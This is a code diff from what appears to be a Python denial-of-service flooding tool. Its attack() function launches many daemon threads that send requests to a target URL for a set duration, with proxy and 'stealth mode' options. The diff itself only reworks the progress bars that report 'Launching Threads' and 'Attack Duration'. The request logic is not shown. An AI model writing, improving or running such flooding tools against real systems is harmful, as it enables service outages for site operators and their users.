@@ -146,22 +146,29 @@ def attack(url, ip, num_threads, duration, proxy_enabled, stealth_mode):
             if stealth_mode:
                 time.sleep(random.uniform(0.1, 0.3))
 
-    # Start a tqdm bar for launching threads and duration
-    with tqdm(total=num_threads + duration, desc="Attack Progress", colour="red") as bar:
-        thread_list = []
-        for _ in range(num_threads):
-            t = threading.Thread(target=make_request)
-            t.daemon = True
-            t.start()
-            thread_list.append(t)
-            bar.update(1)
+    # Initialize threads progress bar
+    print("\n[+] Initializing threads...")
+    thread_bar = tqdm(total=num_threads, desc="Launching Threads", colour="cyan")
+    thread_list = []
+    for _ in range(num_threads):
+        t = threading.Thread(target=make_request)
+        t.daemon = True
+        t.start()
+        thread_list.append(t)
+        thread_bar.update(1)
+    thread_bar.close()
 
-        for _ in range(duration):
-            if stop_flag.is_set():
-                break
-            time.sleep(1)
-            bar.update(1)
+    # Duration progress bar (main attack duration countdown)
+    print("[+] Executing attack...")
+    duration_bar = tqdm(total=duration, desc="Attack Duration", colour="red")
+    for _ in range(duration):
+        if stop_flag.is_set():
+            break
+        time.sleep(1)
+        duration_bar.update(1)
+    duration_bar.close()
 
+    # Stop threads
     stop_flag.set()
     for t in thread_list:
         t.join()
